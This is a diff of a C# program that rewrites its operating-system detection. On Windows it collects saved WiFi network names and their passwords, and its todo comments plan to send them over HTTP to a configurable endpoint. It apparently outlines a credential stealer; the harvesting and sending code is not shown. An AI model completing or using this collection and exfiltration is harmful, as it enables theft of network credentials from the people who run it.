@@ -8,19 +8,26 @@ internal class Program
         List<string> wifiNames = [];
         List<string> wifiPasswords = [];
 
-        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+        switch (RuntimeInformation.OSDescription)
         {
-            wifiNames = GetWiFiNamesWindows();
-            wifiPasswords = GetWiFiPasswordsWindows(wifiNames);
-        }
-        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-        {
+            case string os when os.Contains("Windows"):
+                wifiNames = GetWiFiNamesWindows();
+                wifiPasswords = GetWiFiPasswordsWindows(wifiNames);
+                break;
 
-        }
-        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
-        {
+            case string os when os.Contains("OS X") || os.Contains("macOS"):
+                // Handle macOS
+                break;
 
+            case string os when os.Contains("Linux"):
+                // Handle Linux
+                break;
+
+            default:
+                Console.Error.WriteLine("Unsupported operating system.");
+                break;
         }
+
         // todo: adding object building to combine wifi and password
         // todo: add http call to configurable endpoint to send response object
     }
